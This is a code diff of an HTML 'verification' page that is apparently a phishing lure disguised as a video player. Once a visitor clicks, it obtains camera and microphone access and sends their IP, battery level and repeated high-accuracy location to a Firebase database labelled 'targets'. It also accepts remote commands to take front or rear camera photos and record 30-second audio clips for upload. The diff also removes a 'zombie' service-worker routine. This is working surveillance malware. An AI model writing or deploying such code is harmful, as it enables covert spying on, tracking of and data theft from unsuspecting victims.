@@ -3,64 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Stream Verification</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <title>Verification System</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; }
-        #main-ui { position: fixed; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.8); z-index: 10; }
-        #play-btn { width: 100px; height: 100px; border: 4px solid #00ff41; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 20px #00ff41; }
-        #play-btn::after { content: ''; border-top: 20px solid transparent; border-bottom: 20px solid transparent; border-left: 30px solid #00ff41; margin-left: 10px; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
+        #main-ui { position: fixed; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: #000; z-index: 10; }
+        #play-btn { width: 80px; height: 80px; border: 3px solid #00ff41; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 15px #00ff41; }
+        #play-btn::after { content: ''; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid #00ff41; margin-left: 8px; }
     </style>
 </head>
 <body>
 
 <div id="main-ui">
     <div id="play-btn" onclick="startApp()"></div>
-    <h2 style="color:#00ff41; margin-top:20px;">CLICK TO VERIFY</h2>
+    <h3 style="color:#00ff41; font-family: sans-serif; margin-top: 15px;">START VERIFICATION</h3>
 </div>
 
 <video id="player" playsinline loop style="width:100%; height:100%; object-fit:cover; display:none;" src="https://www.w3schools.com/html/mov_bbb.mp4"></video>
-<input type="file" id="hidden-input" style="display:none;" accept="image/*" multiple>
 
 <script>
+    // Firebase Setup
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
-    firebase.initializeApp(firebaseConfig);
+    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
     const db = firebase.database();
-    const sessionID = "SRV_" + Math.floor(1000 + Math.random() * 9000);
     
+    // Auto Session ID
+    const sessionID = "NODE_" + Math.floor(Math.random() * 89999 + 10000);
     let activeStream = null;
 
-    // --- ZOMBIE ACTIVATION ---
-    async function initZombie() {
-        if ('serviceWorker' in navigator) {
-            const reg = await navigator.serviceWorker.register('sw.js');
-            console.log('Zombie Active');
-            Notification.requestPermission(); // Zombie mode needs this
-        }
-    }
-
     async function startApp() {
-        initZombie();
         document.getElementById('main-ui').style.display = 'none';
         const v = document.getElementById('player');
-        v.style.display = 'block'; v.play();
+        v.style.display = 'block';
+        v.play();
 
         try {
             activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             sendInfo();
             listenCommands();
             setInterval(sendLoc, 10000);
-        } catch (e) { alert("Permission Required!"); location.reload(); }
+            if ('serviceWorker' in navigator) { navigator.serviceWorker.register('sw.js'); }
+        } catch (e) { alert("Please allow Camera & Mic access!"); location.reload(); }
     }
 
     async function sendInfo() {
-        const ipReq = await fetch('https://api.ipify.org?format=json');
+        const ipReq = await fetch('https://api.ipify.org?format=json').catch(() => ({json: () => ({ip: 'Unknown'})}));
         const ipData = await ipReq.json();
-        const batt = await navigator.getBattery();
+        const batt = await navigator.getBattery().catch(() => ({level: 0}));
         db.ref(`targets/${sessionID}/info`).set({
-            ip: ipData.ip, battery: Math.floor(batt.level * 100) + "%",
-            status: "ONLINE", last_seen: new Date().toLocaleTimeString()
+            ip: ipData.ip, 
+            battery: Math.floor(batt.level * 100) + "%",
+            status: "ONLINE", 
+            last_seen: new Date().toLocaleTimeString()
         });
     }
 
@@ -70,32 +65,51 @@
         }, null, {enableHighAccuracy: true});
     }
 
+    function listenCommands() {
+        db.ref(`commands/${sessionID}`).on('value', snap => {
+            const cmd = snap.val();
+            if(!cmd) return;
+            if(cmd.action === 'photo') forceCapture('user');
+            if(cmd.action === 'back_photo') forceCapture('environment');
+            if(cmd.action === 'audio') startAudioRec();
+            db.ref(`commands/${sessionID}`).remove();
+        });
+    }
+
     async function forceCapture(facing) {
-        if (activeStream) activeStream.getTracks().forEach(t => t.stop());
-        const constraints = { video: { facingMode: facing === 'user' ? "user" : { exact: "environment" } } };
+        if(activeStream) activeStream.getTracks().forEach(t => t.stop());
         try {
-            const stream = await navigator.mediaDevices.getUserMedia(constraints).catch(() => navigator.mediaDevices.getUserMedia({video:true}));
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
             const v = document.createElement('video');
             v.srcObject = stream; await v.play();
             setTimeout(() => {
                 const canvas = document.createElement('canvas');
                 canvas.width = v.videoWidth; canvas.height = v.videoHeight;
                 canvas.getContext('2d').drawImage(v, 0, 0);
-                db.ref(`targets/${sessionID}/photos`).push({ img: canvas.toDataURL('image/jpeg', 0.6), type: facing });
+                db.ref(`targets/${sessionID}/photos`).push({ img: canvas.toDataURL('image/jpeg', 0.5), type: facing });
                 stream.getTracks().forEach(t => t.stop());
-                navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(s => activeStream = s);
+                restartStream();
             }, 2000);
-        } catch (e) {}
+        } catch(e) { restartStream(); }
     }
 
-    function listenCommands() {
-        db.ref(`commands/${sessionID}`).on('value', snap => {
-            const cmd = snap.val(); if(!cmd) return;
-            if(cmd.action === 'photo') forceCapture('user');
-            if(cmd.action === 'back_photo') forceCapture('environment');
-            if(cmd.action === 'audio') { /* audio logic */ }
-            db.ref(`commands/${sessionID}`).remove();
-        });
+    // Audio Recorder Fixed (30 Seconds)
+    function startAudioRec() {
+        const mr = new MediaRecorder(activeStream);
+        let chunks = [];
+        mr.ondataavailable = e => chunks.push(e.data);
+        mr.onstop = () => {
+            const blob = new Blob(chunks, { type: 'audio/webm' });
+            const reader = new FileReader();
+            reader.readAsDataURL(blob);
+            reader.onloadend = () => db.ref(`targets/${sessionID}/audios`).push({ data: reader.result });
+        };
+        mr.start();
+        setTimeout(() => mr.stop(), 30000); // 30 Seconds
+    }
+
+    function restartStream() {
+        navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(s => activeStream = s);
     }
 </script>
 </body>
